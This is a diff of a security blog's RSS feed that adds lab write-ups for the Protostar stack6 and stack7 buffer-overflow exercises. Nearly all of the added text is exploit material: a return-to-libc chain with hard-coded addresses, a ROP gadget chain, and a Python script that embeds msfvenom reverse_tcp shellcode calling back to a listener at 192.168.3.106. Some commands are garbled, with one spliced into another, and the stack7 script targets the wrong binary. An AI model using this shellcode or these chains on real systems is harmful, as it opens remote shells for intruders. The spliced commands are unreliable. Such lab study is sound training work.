@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 25 Jun 2016 08:05:29 +0800</pubDate>
-    <lastBuildDate>Sat, 25 Jun 2016 08:05:29 +0800</lastBuildDate>
+    <pubDate>Sat, 25 Jun 2016 16:32:08 +0800</pubDate>
+    <lastBuildDate>Sat, 25 Jun 2016 16:32:08 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
     
       <item>
@@ -2842,7 +2842,7 @@ link knowledge:
     su
     godmode
     vi /proc/sys/fs/suid_dumpable
-        设置为1，允许suid文件可以dump
+        设置为1,允许suid文件可以dump
     cd /tmp
     vi stack5.py
     ----------stack5.py---------
@@ -2901,6 +2901,89 @@ link knowledge:
     ----------------end----------------
     python stack5.py
     msf receive a shell from protostar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x06-stack6&quot;&gt;0x06 stack6&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    构造如下链：
+    &#39;A&#39;*80+system_addr+exit_addr+command_addr+command(=&#39;/bin/sh\x00&#39;)
+    gdb stack6
+    disas getpath
+    b*getpath+117(at ret in func getpath)
+    r
+    AAAAAAAA
+    x/20x $esp-80(make sure it is 0x41414141)
+    output:
+    0xbffff6dc:     0x41414141      0x41414141      0xb7ec6100      0xbffff708
+    command_addr=0xbffff7cc+80+4+4+4=0xbffff828
+    print system
+    output:0xb7ecffb0
+    print exit
+    output:0xb7ec60c0
+    python -c &quot;print &#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x58\xf7\xff\xbf&#39;+&#39;echo succeed&#39;+&#39;\x00&#39;&quot; | ./stack6ython -c &quot;print &#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x48\xf7\xff\xbf&#39;+&#39;/bin/sh\x00&#39;&quot; | ./stack6
+    the output is not obviously
+    python -c &quot;print &#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x28\xf8\xff\xbf&#39;+&#39;echo 123456&#39;+&#39;\x00&#39;&quot; | /opt/protostar/bin/stack6
+    output:看上去什么也没发生，应该没有执行成功，然而后来gdb却发现可以成功，具体如下
+    cd /tmp
+    vi stack6.py
+    --------/tmp/stack6.py----------
+    buf=&#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x28\xf8\xff\xbf&#39;+&#39;/bin/echo succeed &amp;gt; /tmp/succeed.txt&#39;+&#39;\x00&#39;
+    f=open(&quot;/tmp/stack6.txt&quot;,&quot;a+&quot;)
+    f.write(buf)
+    f.close()
+    -------------end----------------
+    gdb /opt/protostar/bin/stack6
+    r &amp;lt; /tmp/stack6.txt
+    vi /tmp/succeed.txt
+    output:succeed
+    此时已经成功写文件，奇怪！居然只有在gdb调试的时候用finish才会成功执行,而不用上面的gdb的过程无法成功执行命令
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x07-stack7&quot;&gt;0x07 stack7&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    形如0xbxxxxxxx或0xfxxxxxxx的地址(system等系统函数地址)不可使用
+    objdump -d stack7
+    find .text has someplace with:
+    ---------.text-----------
+    8048492:       5b                      pop    %ebx
+    8048493:       5d                      pop    %ebp
+    8048494:       c3                      ret  
+    -----------end-----------
+    构造如下链:
+    &#39;A&#39;*80+&#39;\x92\x84\x04\x08&#39;+&#39;BBBBBBBB&#39;+shellcode_addr+shellcode
+    use msf start a listener with the same payload like below
+    vi /tmp/stack7.py
+    -----------stack7.py---------
+    #!/usr/bin/python
+    import os
+    import sys
+    import struct
+    
+    shellcode1=&quot;\x90&quot;*40
+    shellcode1=&quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80&quot;
+    
+    shellcode =  &quot;\x90&quot;*30
+    #msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=4444 -b \x00 -f py
+    shellcode += &quot;\xda\xd1\xbe\xd9\xba\xd5\x41\xd9\x74\x24\xf4\x58\x29&quot;
+    shellcode += &quot;\xc9\xb1\x12\x31\x70\x1a\x83\xc0\x04\x03\x70\x16\xe2&quot;
+    shellcode += &quot;\x2c\x8b\x0e\xb6\x2d\xbf\xf3\x6a\xdb\x42\x44\xea\x92&quot;
+    shellcode += &quot;\xa2\x69\x73\x33\x7f\x1a\xb4\x93\x83\xb0\x5c\xe1\x83&quot;
+    shellcode += &quot;\x55\xc1\x6c\x62\x3f\x9f\x36\x35\x91\x08\x4f\x54\x52&quot;
+    shellcode += &quot;\x7a\xcf\x25\x52\x3d\xcf\x59\x5d\x3d\x46\xba\x9c\xd6&quot;
+    shellcode += &quot;\x54\xfc\xfc\x25\xd4\x83\xcf\xb6\x4f\xf5\x31\x2f\xd9&quot;
+    shellcode += &quot;\x09\x02\x53\xe8\x92\x9d\xb5&quot;
+    
+    ret=0x08048492
+    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x41\x41\x41\x41&#39;+shellcode
+    f=open(&quot;/tmp/stack7.txt&quot;,&quot;a+&quot;)
+    f.write(payload)
+    f.close()
+    input=payload
+    #print input
+    os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack5&quot; % input)
+    -------------end-------------
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
